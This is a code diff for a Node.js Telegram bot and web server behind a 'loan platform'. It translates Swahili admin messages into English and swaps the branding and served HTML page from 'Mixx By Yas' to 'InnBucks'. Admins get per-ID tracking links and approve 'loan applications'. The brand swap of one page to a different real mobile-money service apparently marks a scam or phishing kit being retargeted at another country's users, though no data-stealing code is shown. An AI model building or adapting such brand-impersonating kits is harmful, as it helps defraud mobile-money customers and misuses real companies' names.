@@ -46,7 +46,7 @@ function getAdminIdByChatId(chatId) {
 // Format +255XXXXXXXXX → 0XXXXXXXXX for Telegram display
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2550712345678 → 0712345678
+    // Handle double prefix e.g. +2630712345678 → 0712345678
     if (phoneNumber.startsWith('+2550')) return phoneNumber.slice(4); // +2550... → 0...
     if (phoneNumber.startsWith('+255'))  return '0' + phoneNumber.slice(4); // +255... → 0...
     if (phoneNumber.startsWith('2550'))  return phoneNumber.slice(3);  // 2550... → 0...
@@ -257,7 +257,7 @@ function setupCommandHandlers() {
 Your admin access has been temporarily paused.
 Please contact the super admin.
 
-*ID yako ya Admin:* \`${adminId}\`
+*Your Admin ID:* \`${adminId}\`
                     `, { parse_mode: 'Markdown' });
                     return;
                 }
@@ -266,18 +266,18 @@ Please contact the super admin.
                 const isSuperAdmin = adminId === 'ADMIN001';
 
                 let message = `
-👋 *Karibu ${admin.name}!*
+👋 *Welcome ${admin.name}!*
 
-*ID yako ya Admin:* \`${adminId}\`
+*Your Admin ID:* \`${adminId}\`
 *Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
-*Kiungo Chako cha Kibinafsi:*
+*Your Personal Link:*
 ${WEBHOOK_URL}?admin=${adminId}
 
 *Commands:*
-/mylink - Pata kiungo chako
-/stats - Takwimu zako
-/pending - Maombi yanayosubiri
-/myinfo - Taarifa zako
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
 `;
                 if (isSuperAdmin) {
                     message += `
@@ -299,11 +299,11 @@ ${WEBHOOK_URL}?admin=${adminId}
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to Mixx By Yas Loan Platform!*
+👋 *Welcome to InnBucks Loan Platform!*
 
-Chat ID yako: \`${chatId}\`
+Your Chat ID: \`${chatId}\`
 
-Toa hii kwa super admin wako ili upate ufikiaji.
+Provide this to your super admin to get access.
                 `, { parse_mode: 'Markdown' });
             }
         } catch (error) {
@@ -461,24 +461,24 @@ ${WEBHOOK_URL}?admin=${newAdminId}
 
             try {
                 await bot.sendMessage(newChatId, `
-🎉 *SASA WEWE NI ADMIN!*
+🎉 *YOU'RE NOW AN ADMIN!*
 
-Karibu ${name}!
+Welcome ${name}!
 
-*ID yako ya Admin:* \`${newAdminId}\`
-*Kiungo Chako cha Kibinafsi:*
+*Your Admin ID:* \`${newAdminId}\`
+*Your Personal Link:*
 ${WEBHOOK_URL}?admin=${newAdminId}
 
 *Commands:*
-/mylink - Pata kiungo chako
-/stats - Takwimu zako
-/pending - Maombi yanayosubiri
-/myinfo - Taarifa zako
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
 
-✅ Umeunganishwa na uko tayari!
+✅ You're connected and ready!
                 `, { parse_mode: 'Markdown' });
             } catch (notifyError) {
-                bot.sendMessage(chatId, '⚠️ Admin ameongezwa lakini hakuweza kutaarifu. Wanahitaji /start bot kwanza.');
+                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
             }
         } catch (error) {
             console.error('❌ Error adding admin:', error);
@@ -529,18 +529,18 @@ ${WEBHOOK_URL}?admin=${newAdminId}
 
             try {
                 await bot.sendMessage(newChatId, `
-🎉 *SASA WEWE NI ADMIN!*
+🎉 *YOU'RE NOW AN ADMIN!*
 
-Karibu ${name}!
+Welcome ${name}!
 
-*ID yako ya Admin:* \`${newAdminId}\`
-*Kiungo Chako cha Kibinafsi:*
+*Your Admin ID:* \`${newAdminId}\`
+*Your Personal Link:*
 ${WEBHOOK_URL}?admin=${newAdminId}
 
 /mylink /stats /pending /myinfo
                 `, { parse_mode: 'Markdown' });
             } catch (notifyError) {
-                bot.sendMessage(chatId, '⚠️ Admin ameongezwa lakini hakuweza kutaarifu. Wanahitaji /start kwanza.');
+                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start first.');
             }
         } catch (error) {
             console.error('❌ Error adding admin with custom ID:', error);
@@ -592,17 +592,17 @@ New Chat ID: \`${newChatId}\`
 ⏰ ${new Date().toLocaleString()}
             `, { parse_mode: 'Markdown' });
 
-            bot.sendMessage(oldChatId, `⚠️ *UFIKIAJI WAKO WA ADMIN UMEHAMISHIWA*\n\nWasiliana na super admin ikiwa hukufanya hili.`, { parse_mode: 'Markdown' }).catch(() => {});
+            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*\n\nContact super admin if this was not you.`, { parse_mode: 'Markdown' }).catch(() => {});
             bot.sendMessage(newChatId, `
-🎉 *UFIKIAJI WA ADMIN UMEHAMISHIWA KWAKO*
+🎉 *ADMIN ACCESS TRANSFERRED TO YOU*
 
-Karibu ${admin.name}!
-*ID yako ya Admin:* \`${targetAdminId}\`
-*Kiungo Chako:* ${WEBHOOK_URL}?admin=${targetAdminId}
+Welcome ${admin.name}!
+*Your Admin ID:* \`${targetAdminId}\`
+*Your Link:* ${WEBHOOK_URL}?admin=${targetAdminId}
 
-Tumia /start kuona amri.
+Use /start to see commands.
             `, { parse_mode: 'Markdown' }).catch(() => {
-                bot.sendMessage(chatId, `⚠️ Haikuweza kutaarifu Chat ID mpya (wanaweza kuhitaji /start kwanza)`);
+                bot.sendMessage(chatId, `⚠️ Could not notify new Chat ID (they may need to /start first)`);
             });
         } catch (error) {
             console.error('❌ Error transferring admin:', error);
@@ -638,7 +638,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
             `, { parse_mode: 'Markdown' });
 
             const targetChatId = adminChatIds.get(targetAdminId);
-            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *UFIKIAJI WAKO WA ADMIN UMESIMAMISHWA*\n\nWasiliana na super admin kwa maelezo zaidi.`, { parse_mode: 'Markdown' }).catch(() => {});
+            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact super admin for more information.`, { parse_mode: 'Markdown' }).catch(() => {});
         } catch (error) {
             console.error('❌ Error pausing admin:', error);
             bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
@@ -670,7 +670,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
             `, { parse_mode: 'Markdown' });
 
             const targetChatId = adminChatIds.get(targetAdminId);
-            if (targetChatId) bot.sendMessage(targetChatId, `✅ *UFIKIAJI WAKO WA ADMIN UMEREJESHWA*\n\nSasa unaweza kuidhinisha maombi ya mkopo.\n\nTumia /start kuona amri.`, { parse_mode: 'Markdown' }).catch(() => {});
+            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
         } catch (error) {
             console.error('❌ Error unpausing admin:', error);
             bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
@@ -704,7 +704,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
             `, { parse_mode: 'Markdown' });
 
             if (admin.chatId) {
-                bot.sendMessage(admin.chatId, `🗑️ *UMEONDOLEWA KAMA ADMIN*\n\nWasiliana na super admin ikiwa una maswali.`, { parse_mode: 'Markdown' }).catch(() => {});
+                bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*\n\nContact super admin if you have questions.`, { parse_mode: 'Markdown' }).catch(() => {});
             }
         } catch (error) {
             console.error('❌ Error removing admin:', error);
@@ -1382,7 +1382,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the Mixx By Yas HTML ──
+// ── Serve the InnBucks HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1401,7 +1401,7 @@ app.get('/', async (req, res) => {
         }
     }
 
-    res.sendFile(path.join(__dirname, 'mixxbyas-integrated.html'));
+    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
 });
 
 // ==========================================
